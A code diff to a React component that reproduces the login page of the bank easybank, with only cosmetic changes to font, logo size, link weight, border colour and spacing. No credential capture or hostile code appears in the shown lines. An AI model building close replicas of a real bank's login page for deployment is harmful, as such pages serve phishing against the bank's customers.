@@ -159,7 +159,7 @@ const Easybank = () => {
   return (
     <div
       className="min-h-screen bg-white overflow-x-hidden flex justify-center"
-      style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif" }}
+      style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
     >
       <div style={{ width: `${scaledWidth}px`, height: scaledHeight ? `${scaledHeight}px` : undefined }}>
         <div
@@ -173,9 +173,9 @@ const Easybank = () => {
           {/* Header */}
           <header className="bg-white px-4 py-2">
             <div className="flex items-center justify-between">
-              <img src={easybankLogo} alt="easybank" className="h-12" />
+              <img src={easybankLogo} alt="easybank" className="h-20" />
               <div className="flex items-center gap-3">
-                <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:underline font-semibold">
+                <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:underline">
                   {t.hilfe}
                 </a>
                 <select
@@ -197,7 +197,7 @@ const Easybank = () => {
           <div className="flex gap-4 p-4" style={{ minHeight: "520px" }}>
             {/* Left: Login Card */}
             <div className="w-[370px] flex-shrink-0">
-              <div className="border border-gray-300 rounded bg-white">
+              <div className="border border-black rounded bg-white">
                 {/* Card header */}
                 <div className="px-4 py-3 bg-[#ecf4dc] flex items-center justify-between rounded-t relative">
                   <h1 className="text-sm font-semibold text-black">{t.loginTitle}</h1>
@@ -349,7 +349,7 @@ const Easybank = () => {
                   </div>
                   <div className="h-[2px] bg-[#f6f6f6]" />
                   <div className="p-3">
-                    <div className="flex gap-2 mb-2">
+                    <div className="flex gap-2">
                       <RedWarningIcon />
                       <div>
                         <p className="text-xs text-black leading-snug">
